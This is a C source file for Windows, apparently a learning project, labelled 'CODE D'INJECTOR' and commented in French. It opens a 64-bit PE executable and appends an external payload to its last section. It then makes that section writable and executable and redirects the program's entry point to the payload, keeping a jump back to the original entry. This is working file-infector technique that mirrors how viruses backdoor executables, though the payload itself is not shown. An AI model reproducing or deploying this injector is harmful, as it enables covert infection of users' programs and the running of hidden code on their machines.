#include <windows.h>
#include <stdio.h>
#include <string.h>

extern /*"C"*/ char payload[];
extern /*"C"*/ char __begin_of_code;
extern /*"C"*/ LONGLONG __end_of_code;
extern /*"C"*/ LONGLONG delta;

// extern const wchar_t *kern32_str;
//extern LONGLONG __kern32;

int main(int ac, char **av)
{
    if (ac != 2)
    {
        printf("Usage : %s EXE_FILE\n", av[0]);
        exit(2600);
    }

    char *file = av[1];
    HANDLE hFile;

    printf("CODE D'INJECTOR\n");

    // printf("IN %s\n", kern32_str);
    // printf("__begin %p\n", &begin_of_code);


    //printf("DELTA %lld\n", delta_k32);

    hFile = CreateFile(av[1], GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile()... ERROR\n");
        return (-1);
    }
    printf("CreateFile()... SUCCESS\n");

    // !!!
    DWORD sizeOfCode = (DWORD)((PUCHAR)&__end_of_code + sizeof(LONGLONG)
                              - (PUCHAR)&__begin_of_code);

    // !!!
    // CreateFileMapping
    // j’ai besoin de la taille du fichier
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + sizeOfCode; // !!! fichier dont la taille va changer
    HANDLE hMapFile = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READWRITE,
        0,  // high


        dwNewFileSize, // low
        NULL
        );
if (hMapFile == NULL)
{
    DWORD err = GetLastError();
    printf("Erreur de CreateFileMapping: %d\n", err);
    return err;
}

// void* en notation hongroise: LPVOID
PUCHAR lpMapAdr = (PUCHAR) MapViewOfFile(
    hMapFile,
    FILE_MAP_ALL_ACCESS,
    0,
    0,
    0//dwNewFileSize
);

printf("%c%c\n", ((PCHAR)lpMapAdr)[0], ((PCHAR)lpMapAdr)[1]);


PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) lpMapAdr;
PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)(lpMapAdr + pDosHeader->e_lfanew);

printf("%s\n", (LPCSTR)((PUCHAR)pNtHeader));

PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)
    ((PUCHAR)pNtHeader + sizeof(IMAGE_NT_HEADERS64));

// for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i += 1)
// {
//     printf("Section Name:%s\n", pSectionHeader[i].Name);
// }

PIMAGE_SECTION_HEADER pLastSection = (PIMAGE_SECTION_HEADER)
    ((PUCHAR)pSectionHeader +
    (pNtHeader->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER));

printf("Last Section Name:%s\n", pLastSection->Name);


DWORD OldEntry = pNtHeader->OptionalHeader.AddressOfEntryPoint;
DWORD szData = pLastSection->SizeOfRawData;
DWORD NewEntry = pLastSection->VirtualAddress + szData;
LONGLONG forDelta = (LONGLONG)OldEntry - (LONGLONG)NewEntry;

// protect!!
DWORD oldProtect;
VirtualProtect(&delta, 4096, PAGE_READWRITE, &oldProtect);
delta = forDelta; //! setfaults
__end_of_code = (LONGLONG)sizeOfCode;

// kern32 = (LONGLONG)kern32_str;

printf("LAST VIRTADR %x\n", pLastSection->VirtualAddress);
printf("LAST POINTRAW %x\n", pLastSection->PointerToRawData);
printf("OldEntry %x NewEntry %x\n", OldEntry, NewEntry);
printf("PAYLOAD %d\n", sizeOfCode);

PUCHAR dstCpy = lpMapAdr + pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
memcpy(dstCpy, payload, sizeOfCode);

pLastSection->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
pLastSection->SizeOfRawData += sizeOfCode;
pLastSection->Misc.VirtualSize += sizeOfCode;


pNtHeader->OptionalHeader.AddressOfEntryPoint = NewEntry;

if (!FlushViewOfFile(lpMapAdr, dwNewFileSize))
{
    DWORD err = GetLastError();
    printf("Erreur de FlushViewOfFile: %d\n", err);
    return err;
}

UnmapViewOfFile(lpMapAdr);

if ((CloseHandle(hFile)) == 0) {
    printf("CloseHandle()... ERROR\n");
    return (-1);
}

printf("CloseHandle()... SUCCESS\n");

return (0);
}